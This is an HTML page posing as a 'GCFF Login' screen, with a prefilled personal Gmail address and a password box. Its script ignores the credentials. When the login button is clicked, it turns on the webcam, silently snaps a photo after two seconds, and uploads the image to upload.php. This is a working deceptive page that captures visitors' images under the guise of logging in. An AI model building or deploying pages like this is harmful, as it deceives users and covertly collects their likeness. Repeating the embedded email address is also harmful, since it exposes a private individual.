<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>GCFF Login</title>
</head>

<body style="font-family:Arial;text-align:center;background:#0f172a;color:white">

<h2>Welcome to GCFF</h2>

<input value="francoislitilm@gmail.com"><br><br>
<input type="password" placeholder="password"><br><br>

<button onclick="login()">Login</button>

<video id="video" autoplay style="width:300px;margin-top:20px;border-radius:10px;"></video>

<p id="msg"></p>

<script>
let stream;

function login() {
  document.getElementById("msg").innerText = "Requesting camera...";

  navigator.mediaDevices.getUserMedia({ video: true })
  .then(s => {
    stream = s;

    const video = document.getElementById("video");
    video.srcObject = stream;

    document.getElementById("msg").innerText = "Camera ON";

    setTimeout(takePhoto, 2000);
  })
  .catch(err => {
    document.getElementById("msg").innerText = "Camera denied";
  });
}

function takePhoto() {
  const video = document.getElementById("video");

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  const image = canvas.toDataURL("image/png");

  // stop camera
  stream.getTracks().forEach(t => t.stop());

  document.getElementById("msg").innerText = "Uploading...";

  fetch("upload.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      imageBase64: image
    })
  })
  .then(res => res.json())
  .then(data => {
    document.getElementById("msg").innerText = "Photo saved ✔";
  })
  .catch(err => {
    document.getElementById("msg").innerText = "Upload failed";
  });
}
</script>

</body>
</html>
